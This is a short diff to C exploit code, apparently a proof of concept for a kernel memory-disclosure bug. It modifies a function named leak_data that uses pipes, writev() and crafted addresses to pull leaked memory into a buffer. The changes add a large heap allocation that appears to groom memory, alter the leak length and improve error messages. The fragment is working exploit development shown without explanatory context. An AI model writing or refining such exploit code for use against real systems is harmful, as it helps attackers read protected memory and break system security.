@@ -272,9 +272,11 @@ void leak_data(void* leakBuffer, int leakAmount,
     memcpy(&addr, buffer+size1-8, 8);
     if (addr == 0) err(1, "bad address");
     if (extraLeakAmount > 0) {
+        char* z = malloc(100000);
+        memset(z,'z',100000);
         unsigned long extra[4] = { 
             addr,
-            4096+8, // leakAmount-8,  // fails if it's 4096+8
+            leakAmount,
             extraLeakAddress,
             extraLeakAmount, 
         };
@@ -310,10 +312,10 @@ void leak_data(void* leakBuffer, int leakAmount,
         errx(1, "writev() returned wrong value: needed 0x%lx", totalLength);
   // leaked data
   printf("PARENT: Reading leaked data\n");
-  if (read(leakPipe[0], leakBuffer, leakAmount) != leakAmount) err(1, "reading leak");
+  b = read(leakPipe[0], leakBuffer, leakAmount);
+  if (b != leakAmount) errx(1, "reading leak: read 0x%x needed 0x%x", b, leakAmount);
   if (0<extraLeakAmount) {
     if (read(leakPipe[0], extraLeakBuffer, extraLeakAmount) != extraLeakAmount) err(1, "reading extra leak");
-    memcpy(extraLeakBuffer, leakBuffer+0x1008, 8); // TODO!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   }
   
   int status;
